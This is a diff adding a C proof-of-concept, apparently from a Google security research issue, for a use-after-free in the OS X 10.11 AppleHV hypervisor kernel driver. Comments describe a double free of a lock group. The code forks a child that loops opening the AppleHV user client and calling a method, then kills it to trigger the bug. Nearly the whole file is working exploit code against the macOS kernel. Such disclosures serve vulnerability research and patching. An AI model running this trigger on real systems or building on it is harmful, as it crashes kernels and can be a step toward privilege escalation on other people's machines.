@@ -1,0 +1,90 @@
+/*
+Source: https://code.google.com/p/google-security-research/issues/detail?id=580
+
+The hv_space lock group gets an extra ref dropped when you kill a process with an AppleHV userclient;
+one via IOService::terminateWorker calling the AppleHVClient::free method (which calls lck_rw_free on the 
+lock group using the pointer hanging off the global _hv variable) and secondly via the hypervisor
+machine_thread_destroy callback (hv_callback_thread_destroy) which also calls lck_rw_free with a lock group
+pointer taken from _hv.
+
+tested on OS X 10.11 ElCapitan (15a284) on MacBookAir 5,2
+*/
+
+//ianbeer
+
+// boot-args: debug=0x144 -v pmuflags=1 kdp_match_name=en3 gzalloc_min=100 gzalloc_max=300 -zp -zc
+
+/*
+OS X Kernel UaF in hypervisor driver
+
+The hv_space lock group gets an extra ref dropped (uaf) when you kill a process with an AppleHV userclient;
+one via IOService::terminateWorker calling the AppleHVClient::free method (which calls lck_rw_free on the 
+lock group using the pointer hanging off the global _hv variable) and secondly via the hypervisor
+machine_thread_destroy callback (hv_callback_thread_destroy) which also calls lck_rw_free with a lock group
+pointer taken from _hv.
+
+tested on OS X 10.11 ElCapitan (15a284) on MacBookAir 5,2
+*/
+#include <stdio.h>
+#include <stdlib.h>
+#include <signal.h>
+#include <unistd.h>
+#include <IOKit/IOKitLib.h>
+
+int go() {
+  io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("AppleHV"));
+  if (service == MACH_PORT_NULL) {
+    printf("can't find service\n");
+    return 0;
+  }
+
+  while(1) {
+    io_connect_t conn;
+    IOServiceOpen(service, mach_task_self(), 0, &conn);
+    if (conn == MACH_PORT_NULL) {
+      printf("can't connect to service\n");
+      return 0;
+    }
+
+    uint64_t inputScalar[16];
+    size_t inputScalarCnt = 0;
+
+    uint8_t inputStruct[4096];
+    size_t inputStructCnt = 0;
+
+    uint64_t outputScalar[16] = {0};
+    uint32_t outputScalarCnt = 16;
+
+    char outputStruct[4096] = {0};
+    size_t outputStructCnt = 4096;
+
+    kern_return_t err = IOConnectCallMethod(
+      conn,
+      1,
+      inputScalar,
+      inputScalarCnt,
+      inputStruct,
+      inputStructCnt,
+      outputScalar,
+      &outputScalarCnt,
+      outputStruct,
+      &outputStructCnt);
+
+    IOServiceClose(conn);
+  }
+}
+
+
+int main(int argc, char** argv) {
+  pid_t child = fork();
+  if (child == 0) {
+    go();
+  } else {
+    sleep(1);
+    kill(child, 9);
+    int sl;
+    wait(&sl);
+  }
+  return 0;
+}
+
